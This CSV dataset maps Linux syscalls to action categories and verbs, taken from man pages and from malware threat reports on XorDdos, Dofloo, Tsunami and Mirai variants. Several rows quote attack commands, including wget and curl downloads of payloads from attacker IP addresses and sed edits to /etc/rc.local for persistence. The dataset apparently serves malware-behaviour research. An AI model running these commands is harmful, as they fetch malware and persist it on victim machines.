EntityType,ActionType,Source,Syscall,EnVerb,Sentence
FILE,CREATE_OPEN,man,symlink(),create,
FILE,CREATE_OPEN,Xorddos.Micro,symlink(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
FILE,CREATE_OPEN,Dofloo.Tend,symlink(),add,This Backdoor adds the following processes: sed -i -e '/exit/d' /etc/rc.local
FILE,CREATE_OPEN,Tsunami.Aquasec3,symlink(),drop,The file k.sh that was dropped and executed on the attacked server
FILE,CREATE_OPEN,man,symlinkat(),create,
FILE,CREATE_OPEN,man,umask(),set,
FILE,DELETE,man,fremovexattr(),remove,
FILE,DELETE,man,munmap(),unmap,
FILE,DELETE,man,remove(),delete,
FILE,DELETE,man,remove(),remove,
FILE,DELETE,None,remove(),drop,drop the file from the victim machine
FILE,DELETE,Darlloz.Trend,rm(),delete,This worm deletes the following files
FILE,DELETE,None,rm(),drop,drops each specified file
FILE,DELETE,man,rmdir(),delete,
FILE,DELETE,None,rmdir(),drop,drop the file from the victim machine
FILE,DELETE,man,umount(),remove,
FILE,DELETE,man,umount(),unmount,
FILE,DELETE,man,umount2(),remove,
FILE,DELETE,man,umount2(),unmount,
FILE,DELETE,man,unlink(),delete,
FILE,DELETE,man,unlinkat(),remove,
FILE,DELETE,None,unlinkat(),drop,drop the file from the victim machine
FILE,DIR,man,getcwd(),get,
FILE,DIR,man,getdents(),get,
FILE,FD_DUP,man,dup(),duplicate,
FILE,FD_DUP,man,dup(),allocate,
FILE,FD_DUP,man,dup(),create,
FILE,FD_DUP,man,dup(),share,
FILE,FD_DUP,man,dup2(),duplicate,
FILE,FD_DUP,man,dup2(),allocate,
FILE,FD_DUP,man,dup2(),create,
FILE,FD_DUP,man,dup2(),share,
FILE,FD_DUP,man,dup3(),duplicate,
FILE,FD_DUP,man,dup3(),allocate,
FILE,FD_DUP,man,eventfd(),create,
FILE,FD_DUP,man,eventfd2(),create,
FILE,FD_DUP,man,signalfd(),create,
FILE,FD_DUP,man,userfaultfd(),create,
FILE,FD_OTHER,man,_newselect(),multiplex,
FILE,FD_OTHER,man,_newselect(),monitor,
FILE,FD_OTHER,man,epoll_ctl(),add,
FILE,FD_OTHER,man,epoll_ctl(),remove,
FILE,FD_OTHER,man,epoll_ctl(),control,
FILE,FD_OTHER,man,epoll_ctl(),change,
FILE,FD_OTHER,man,epoll_pwait(),wait,
FILE,FD_OTHER,man,epoll_wait(),wait,
FILE,FD_OTHER,man,fcntl(),find,
FILE,FD_OTHER,man,fcntl(),get,
FILE,FD_OTHER,man,fcntl(),set,
FILE,FD_OTHER,man,fcntl(),manipulate,
FILE,FD_OTHER,man,fcntl64(),find,
FILE,FD_OTHER,man,fcntl64(),get,
FILE,FD_OTHER,man,fcntl64(),set,
FILE,FD_OTHER,man,fcntl64(),manipulate,
FILE,FD_OTHER,man,futimesat(),change,
FILE,FD_OTHER,man,pselect6(),multiplex,
FILE,FD_OTHER,man,pselect6(),monitor,
FILE,FD_OTHER,man,select(),multiplex,
FILE,FD_OTHER,man,select(),monitor,
FILE,FD_OTHER,man,sendfile(),transfer,
FILE,FD_OTHER,man,sendfile(),copy,
FILE,FD_OTHER,man,sendfile64(),transfer,
FILE,FD_OTHER,man,sendfile64(),copy,
FILE,FD_OTHER,man,signalfd4(),create,
FILE,FD_OTHER,man,timerfd_create(),create,
FILE,FD_OTHER,man,timerfd_settime(),disarm,
FILE,FD_OTHER,man,timerfd_settime(),arm,
FILE,FILE_READ,man,fgetxattr(),retrieve,
FILE,FILE_READ,man,flistxattr(),retrieve,
FILE,FILE_READ,man,flistxattr(),list,
FILE,FILE_READ,man,getdents64(),get,
FILE,FILE_READ,man,getdents64(),read,
FILE,FILE_READ,man,getxattr(),retrieve,
FILE,FILE_READ,man,lgetxattr(),retrieve,
FILE,FILE_READ,man,llistxattr(),retrieve,
FILE,FILE_READ,man,llistxattr(),list,
FILE,FILE_READ,man,pread64(),read,
FILE,FILE_READ,man,preadv(),read,
FILE,FILE_READ,man,preadv2(),read,
FILE,FILE_READ,man,read(),seek,
FILE,FILE_READ,man,read(),read,
FILE,FILE_READ,Dofloo.Security,read(),gather,"Once the malware has infected a system, it can gather system information, including model ID and CPU description, speed, family, model, and type."
FILE,FILE_READ,Xorddos.Micro,read(),fetch,"The user mode malware calls the function getself(), which invokes readlink() to fetch the location of the malware file image on disk."
FILE,FILE_READ,Xorddos.Intezer,read(),look,"As shown in Figure 6, the malware looks up its current path and moves the binary to the created folder. It hides the file by naming it “.po1kitd-update-k”."
FILE,FILE_READ,Dofloo.Bleep,read(),see,campaigns started spreading to the cloud following the drop in activity seen by ransomware operations after the end of 2017.
FILE,FILE_READ,Miria.Trend,read(),use,Exploits - takes advantage of a software vulnerability or security flaw and can be used to remotely access a network and gain elevated privileges
FILE,FILE_READ,Xorddos.Micro,read(),extract,Screenshot of the randomly-named files the XorDdos rootkit extracts to the /usr/bin folder.
FILE,FILE_READ,man,readahead(),initiate,
FILE,FILE_READ,man,readdir(),read,
FILE,FILE_READ,man,readlink(),place,
FILE,FILE_READ,man,readlink(),truncate,
FILE,FILE_READ,man,readlink(),read,
FILE,FILE_READ,Dofloo.Trend,readlink(),gather,This Backdoor gathers the following data: CPU information Memory statistics IP address of infected machine Reads the following information from /proc:
FILE,FILE_READ,Xorddos.Micro,readlink(),fetch,it calls the readlink API with the first parameter as /proc/self/exe to fetch its full process path.
FILE,FILE_READ,Tsunami.Aquasec,readlink(),look,The attackers are looking for more vulnerable machines on the same network as the infected machine.
FILE,FILE_READ,Dofloo.Syscall,readlink(),see,however before it overwrites this file it first checks to see if it has already done so.
FILE,FILE_READ,Dofloo.Mal,readlink(),use,"how this malware use socket to connect an IP, for example, since the code is too long. But to be noted, since ARM architecture has different structure than Intel, and ARM is designed for the embedded systems, you will see many different method for the detail operation that is involving with the system calls."
FILE,FILE_READ,Xorddos.Intezer,readlink(),extract,hostos	Distribution	Extracted from /etc/issue or /etc/redhat-release
FILE,FILE_READ,man,readlinkat(),place,
FILE,FILE_READ,man,readlinkat(),read,
FILE,FILE_READ,man,readv(),read,
FILE,FILE_READ,man,setxattr(),set,
FILE,FILE_READ,man,sysfs(),get,
FILE,OTHER,man,_llseek(),reposition,
FILE,OTHER,man,acct(),enable,
FILE,OTHER,man,acct(),switch off,
FILE,OTHER,man,acct(),disable,
FILE,OTHER,man,acct(),switch on,
FILE,OTHER,man,chroot(),change,
FILE,OTHER,man,copy_file_range(),copy,
FILE,OTHER,man,fallocate(),manipulate,
FILE,OTHER,man,fanotify_init(),initialize,
FILE,OTHER,man,fanotify_init(),create,
FILE,OTHER,man,fdatasync(),synchronize,
FILE,OTHER,man,fsync(),synchronize,
FILE,OTHER,man,inotify_add_watch(),add,
FILE,OTHER,man,inotify_add_watch(),modifies,
FILE,OTHER,man,inotify_init(),initialize,
FILE,OTHER,man,inotify_init1(),initialize,
FILE,OTHER,man,inotify_rm_watch(),remove,
FILE,OTHER,man,listxattr(),extended,
FILE,OTHER,man,listxattr(),retrieve,
FILE,OTHER,man,lookup_dcookie(),return,
FILE,OTHER,man,lseek(),reposition,
FILE,OTHER,man,modify_ldt(),write,
FILE,OTHER,man,modify_ldt(),get,
FILE,OTHER,man,modify_ldt(),set,
FILE,OTHER,man,modify_ldt(),read,
FILE,OTHER,man,msync(),synchronize,
FILE,OTHER,man,quotactl(),manipulate,
FILE,OTHER,man,remap_file_pages(),create,
FILE,OTHER,man,sync_file_range(),sync,
FILE,OTHER,man,sync_file_range2(),sync,
FILE,OTHER,man,syncfs(),commit,
FILE,OTHER,man,tee(),write,
FILE,OTHER,man,tee(),read,
FILE,OTHER,man,tee(),copy,
FILE,OTHER,man,timerfd_gettime(),fetch,
FILE,STATUS,man,fstat(),get,
FILE,STATUS,man,fstat(),retrieve,
FILE,STATUS,man,fstat64(),get,
FILE,STATUS,man,fstat64(),retrieve,
FILE,STATUS,man,fstatat64(),get,
FILE,STATUS,man,fstatat64(),retrieve,
FILE,STATUS,man,fstatfs(),get,
FILE,STATUS,man,fstatfs64(),get,
FILE,STATUS,man,lstat(),get,
FILE,STATUS,man,lstat(),retrieve,
FILE,STATUS,man,lstat64(),get,
FILE,STATUS,man,lstat64(),retrieve,
FILE,STATUS,man,newfstatat(),get,
FILE,STATUS,man,newfstatat(),retrieve,
FILE,STATUS,man,oldfstat(),get,
FILE,STATUS,man,oldfstat(),retrieve,
FILE,STATUS,man,oldlstat(),get,
FILE,STATUS,man,oldlstat(),retrieve,
FILE,STATUS,man,oldstat(),get,
FILE,STATUS,man,oldstat(),retrieve,
FILE,STATUS,man,stat(),get,
FILE,STATUS,man,stat(),retrieve,
FILE,STATUS,man,stat64(),get,
FILE,STATUS,man,stat64(),retrieve,
FILE,STATUS,man,statfs(),get,
FILE,STATUS,man,statfs64(),get,
FILE,STATUS,man,statx(),get,
FILE,UPDATE,man,chdir(),change,
FILE,UPDATE,man,chmod(),change,
FILE,UPDATE,Xorddos.Micro,chmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
FILE,UPDATE,Xorddos.Micro,chmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
FILE,UPDATE,man,chown(),change,
FILE,UPDATE,man,chown32(),change,
FILE,UPDATE,man,fadvise64(),access,
FILE,UPDATE,man,fadvise64(),predeclare,
FILE,UPDATE,man,fadvise64_64(),access,
FILE,UPDATE,man,fadvise64_64(),predeclare,
FILE,UPDATE,man,fanotify_mark(),add,
FILE,UPDATE,man,fanotify_mark(),remove,
FILE,UPDATE,man,fanotify_mark(),modify,
FILE,UPDATE,man,fchdir(),change,
FILE,UPDATE,man,fchmod(),change,
FILE,UPDATE,Xorddos.Micro,fchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
FILE,UPDATE,Xorddos.Micro,fchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
FILE,UPDATE,man,fchmodat(),change,
FILE,UPDATE,man,fchown(),change,
FILE,UPDATE,man,fchown32(),change,
FILE,UPDATE,man,fchownat(),change,
FILE,UPDATE,man,fsetxattr(),set,
FILE,UPDATE,man,ftruncate(),truncate,
FILE,UPDATE,man,ftruncate64(),truncate,
FILE,UPDATE,man,lchmod(),change,
FILE,UPDATE,Xorddos.Micro,lchmod(),modify,A rootkit is a kernel module that hides the presence of malicious code by modifying kernel data structures.
FILE,UPDATE,Xorddos.Micro,lchmod(),set,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
FILE,UPDATE,man,lchown(),change,
FILE,UPDATE,man,lchown32(),change,
FILE,UPDATE,man,lremovexattr(),remove,
FILE,UPDATE,man,lsetxattr(),set,
FILE,UPDATE,man,pivot_root(),change,
FILE,UPDATE,man,pwrite64(),write,
FILE,UPDATE,man,pwritev(),write,
FILE,UPDATE,man,pwritev2(),write,
FILE,UPDATE,man,removexattr(),remove,
FILE,UPDATE,man,rename(),rename,
FILE,UPDATE,man,rename(),change,
FILE,UPDATE,Xorddos.Trend2,rename(),update,Figure 3. Code snippet showing XORDDoS’ capability to download and update files.
FILE,UPDATE,Dofloo.Syscall,rename(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
FILE,UPDATE,Dofloo.Security,rename(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
FILE,UPDATE,Dofloo.Bleep,rename(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
FILE,UPDATE,man,renameat(),rename,
FILE,UPDATE,man,renameat(),moving,
FILE,UPDATE,man,renameat(),change,
FILE,UPDATE,man,renameat2(),rename,
FILE,UPDATE,man,renameat2(),moving,
FILE,UPDATE,man,renameat2(),change,
FILE,UPDATE,man,sync(),commit,
FILE,UPDATE,man,truncate(),truncate,
FILE,UPDATE,man,truncate64(),truncate,
FILE,UPDATE,man,utime(),change,
FILE,UPDATE,man,utimensat(),change,
FILE,UPDATE,man,utimes(),change,
FILE,UPDATE,man,write(),write,
FILE,UPDATE,Xorddos.Micro,write(),update,"if the file doesn’t exist, then it creates the file and updates it with a random 32-byte string."
FILE,UPDATE,Dofloo.Syscall,write(),format,"A string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example)."
FILE,UPDATE,Dofloo.Security,write(),modify,"Trend Micro researchers also discovered that the latest variant of the AESDDoS bot can modify files i.e., /etc/rc.local and /etc/rc.d/rc.local"
FILE,UPDATE,Dofloo.Bleep,write(),overwrite,allowing attackers to overwrite the host runc binary and gain root-level code execution privileges.
FILE,UPDATE,Xorddos.Micro,write(),set,"The malware calls the subroutine daemon(__nochdir, __noclose) to set itself as a background daemon process, which internally calls fork() and setsid()."
FILE,UPDATE,man,writev(),write,
FILE,WAIT,man,poll(),wait for,
FILE,WAIT,man,poll(),monitor,
FILE,WAIT,man,poll(),block,
FILE,WAIT,man,ppoll(),wait for,
FILE,WAIT,man,ppoll(),monitor,
FILE,WAIT,man,ppoll(),block,
ID,ID_GET,man,getegid(),get,
ID,ID_GET,man,getegid32(),get,
ID,ID_GET,man,geteuid(),get,
ID,ID_GET,man,geteuid32(),get,
ID,ID_GET,man,getgid(),get,
ID,ID_GET,man,getgid32(),get,
ID,ID_GET,man,getgroups(),get,
ID,ID_GET,man,getgroups32(),get,
ID,ID_GET,man,getpgid(),get,
ID,ID_GET,man,getpgrp(),get,
ID,ID_GET,man,getpgrp(),retrieve,
ID,ID_GET,man,getpid(),get,
ID,ID_GET,man,getppid(),get,
ID,ID_GET,man,getresgid(),get,
ID,ID_GET,man,getresgid32(),get,
ID,ID_GET,man,getresuid(),get,
ID,ID_GET,man,getresuid32(),get,
ID,ID_GET,man,getsid(),get,
ID,ID_GET,man,gettid(),get,
ID,ID_GET,man,getuid(),get,
ID,ID_GET,man,getuid32(),get,
ID,ID_SET,man,setfsgid(),set,
ID,ID_SET,man,setfsgid32(),set,
ID,ID_SET,man,setfsuid(),set,
ID,ID_SET,man,setfsuid32(),set,
ID,ID_SET,man,setgid(),set,
ID,ID_SET,man,setgid32(),set,
ID,ID_SET,man,setgroups(),set,
ID,ID_SET,man,setgroups32(),set,
ID,ID_SET,man,setpgid(),set,
ID,ID_SET,man,setregid(),set,
ID,ID_SET,man,setregid32(),set,
ID,ID_SET,man,setresgid(),set,
ID,ID_SET,man,setresgid32(),set,
ID,ID_SET,man,setresuid(),set,
ID,ID_SET,man,setresuid32(),set,
ID,ID_SET,man,setreuid(),set,
ID,ID_SET,man,setreuid32(),set,
ID,ID_SET,man,setsid(),set,
ID,ID_SET,man,setsid(),create,
ID,ID_SET,Xorddos.Micro,setsid(),assign,"Provides a root privilege by setting a new set of credentials and assigning its UID, GID to “0”"
ID,ID_SET,man,setuid(),set,
ID,ID_SET,man,setuid32(),set,
INFO,INFO_GET,man,get_kernel_syms(),retrieve,
INFO,INFO_GET,man,getcpu(),identify,
INFO,INFO_GET,man,getcpu(),determine,
INFO,INFO_GET,man,getpriority(),get,
INFO,INFO_GET,man,getrlimit(),get,
INFO,INFO_GET,man,getrusage(),get,
INFO,INFO_GET,man,ipc(),communicate with,
INFO,INFO_GET,man,kexec_file_load(),read,
INFO,INFO_GET,man,kexec_file_load(),load,
INFO,INFO_GET,man,kexec_load(),load,
INFO,INFO_GET,man,madvise(),give,
INFO,INFO_GET,man,msgget(),get,
INFO,INFO_GET,man,msgget(),obtain,
INFO,INFO_GET,man,msgget(),create,
INFO,INFO_GET,man,oldolduname(),get,
INFO,INFO_GET,man,olduname(),get,
INFO,INFO_GET,man,prlimit64(),get,
INFO,INFO_GET,man,request_key(),request,
INFO,INFO_GET,man,request_key(),find,
INFO,INFO_GET,man,request_key(),search for,
INFO,INFO_GET,man,sched_get_priority_max(),get,
INFO,INFO_GET,man,sched_get_priority_min(),get,
INFO,INFO_GET,man,semget(),get,
INFO,INFO_GET,man,semget(),obtain,
INFO,INFO_GET,man,semget(),create,
INFO,INFO_GET,man,sysinfo(),return,
INFO,INFO_GET,None,sysinfo(),gather,gather system information
INFO,INFO_GET,None,sysinfo(),look,look for system information
INFO,INFO_GET,None,sysinfo(),find,find linux kernel information
INFO,INFO_GET,man,syslog(),set,
INFO,INFO_GET,man,syslog(),clear,
INFO,INFO_GET,man,syslog(),read,
INFO,INFO_GET,man,ugetrlimit(),get,
INFO,INFO_GET,man,uname(),get,
INFO,INFO_GET,None,uname(),gather,gather system information
INFO,INFO_GET,None,uname(),look,look for system information
INFO,INFO_GET,None,uname(),find,find linux kernel information
INFO,INFO_GET,man,ustat(),get,
INFO,INFO_SET,man,_sysctl(),write,
INFO,INFO_SET,man,_sysctl(),read,
INFO,INFO_SET,man,add_key(),update,
INFO,INFO_SET,man,add_key(),create,
INFO,INFO_SET,man,add_key(),add,
INFO,INFO_SET,man,add_key(),attach,
INFO,INFO_SET,man,add_key(),instantiate,
INFO,INFO_SET,man,keyctl(),manipulate,
INFO,INFO_SET,man,perf_event_open(),set up,
INFO,INFO_SET,man,perf_event_open(),create,
INFO,INFO_SET,man,setdomainname(),set,
INFO,INFO_SET,man,setdomainname(),change,
INFO,INFO_SET,man,sethostname(),set,
INFO,INFO_SET,man,sethostname(),change,
INFO,INFO_SET,man,setpriority(),set,
INFO,INFO_SET,man,setrlimit(),set,
INFO,INFO_SET,man,shmctl(),share,
MEM,MEM,man,arch_prctl(),set,
MEM,MEM,man,brk(),set,
MEM,MEM,man,brk(),change,
MEM,MEM,man,futex(),wait,
MEM,MEM,man,futex(),wake,
MEM,MEM,man,futex(),lock,
MEM,MEM,man,get_mempolicy(),retrieve,
MEM,MEM,man,mbind(),set,
MEM,MEM,man,membarrier(),issue,
MEM,MEM,man,mlock(),lock,
MEM,MEM,man,mlock2(),lock,
MEM,MEM,man,mlockall(),lock,
MEM,MEM,man,mprotect(),set,
MEM,MEM,man,mremap(),remap,
MEM,MEM,man,mremap(),expand,
MEM,MEM,man,munlock(),unlock,
MEM,MEM,man,munlockall(),unlock,
MEM,MEM,man,pkey_mprotect(),set,
MEM,MEM,man,pkey_mprotect(),change,
MEM,MEM,man,set_mempolicy(),set,
MEM,MEM,man,set_robust_list(),set,
MEM,MEM,man,set_thread_area(),set,
MEM,MEM,man,set_tid_address(),set,
MEM,MEM,man,shmat(),attach,
MEM,MEM,man,shmdt(),detach,
MEM,MEM,man,shmget(),allocate,
NET,NET_CLOSE,man,mq_unlink(),remove,
NET,NET_CLOSE,man,shutdown(),shut down,
NET,NET_CONNECT,man,accept(),creates,
NET,NET_CONNECT,man,accept(),accept,
NET,NET_CONNECT,man,accept4(),creates,
NET,NET_CONNECT,man,accept4(),accept,
NET,NET_CONNECT,man,bind(),assign,
NET,NET_CONNECT,man,bind(),bind,
NET,NET_CONNECT,Xorddos.Micro,bind(),hook,Hides the UDP4 connection by hooking /proc/net/udpHides the UDP6 connection by hooking /proc/net/udp6
NET,NET_CONNECT,man,connect(),initiate,
NET,NET_CONNECT,man,connect(),connect,
NET,NET_CONNECT,man,mq_notify(),unregister for,
NET,NET_CONNECT,man,mq_notify(),register for,
NET,NET_CONNECT,man,mq_open(),open,
NET,NET_CONNECT,man,mq_open(),create,
NET,NET_CONNECT,man,pipe(),create,
NET,NET_CONNECT,man,pipe2(),create,
NET,NET_CONNECT,man,socket(),create,
NET,NET_CONNECT,Xorddos.Micro,socket(),hook,Hides the TCP4 connection by hooking /proc/net/tcpHides the TCP6 connection by hooking /proc/net/tcp6
NET,NET_CONNECT,man,socketpair(),create,
NET,NET_OPTION,man,getpeername(),get,
NET,NET_OPTION,man,getsockname(),get,
NET,NET_OPTION,man,getsockopt(),get,
NET,NET_OPTION,man,getsockopt(),manipulate,
NET,NET_OPTION,man,mq_getsetattr(),modify,
NET,NET_OPTION,man,mq_getsetattr(),get,
NET,NET_OPTION,man,mq_getsetattr(),retrieve,
NET,NET_OPTION,man,mq_getsetattr(),set,
NET,NET_OPTION,man,setsockopt(),set,
NET,NET_OPTION,man,setsockopt(),manipulate,
NET,NET_TRANSMIT,man,listen(),listen for,
NET,NET_TRANSMIT,man,mq_timedreceive(),receive,
NET,NET_TRANSMIT,man,mq_timedsend(),send,
NET,NET_TRANSMIT,man,recv(),receive,
NET,NET_TRANSMIT,Miria.NJCCIC,recv(),communicate,Miori has resurfaced using a text-based protocol to communicate with its command-and-control (C&C) rather than the customary use of binary-based protocol.
NET,NET_TRANSMIT,Xorddos.Micro,recv(),download,The attacker communicates with a bot to SSH brute force a target device and download XorDdos.
NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),wget,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
NET,NET_TRANSMIT,Tsunami.Aquasec,recv(),curl,"inserts a function that is aimed to replace curl or wget, namely to download files from the web."
NET,NET_TRANSMIT,man,recvfrom(),receive,
NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,recvfrom(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend3,recvfrom(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,recvfrom(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,recvmmsg(),receive,
NET,NET_TRANSMIT,man,recvmsg(),receive,
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend2,recvmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,recvmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,send(),send,
NET,NET_TRANSMIT,None,send(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,Xorddos.Trend2,send(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,send(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend4,send(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,send(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,sendmmsg(),transmit,
NET,NET_TRANSMIT,man,sendmmsg(),send,
NET,NET_TRANSMIT,man,sendmsg(),send,
NET,NET_TRANSMIT,None,sendmsg(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendmsg(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend6,sendmsg(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,sendmsg(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
NET,NET_TRANSMIT,man,sendto(),send,
NET,NET_TRANSMIT,None,sendto(),transfer,transfer data to command and control server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),communicate,encrypt its strings and to communicate with the command and control (C&C) server.
NET,NET_TRANSMIT,Xorddos.Trend2,sendto(),download,Code snippet showing XORDDoS’ capability to download and update files.
NET,NET_TRANSMIT,Xorddos.Trend5,sendto(),wget,wget http://122.51.133.49:10086/VIP –O VIP
NET,NET_TRANSMIT,Tsunami.Jun,sendto(),curl,curl -o /tmp/russ http://106[.].246.224.219/russia.sh); 
PROC,PROC_COMM,man,msgctl(),control,
PROC,PROC_COMM,man,msgrcv(),operate,
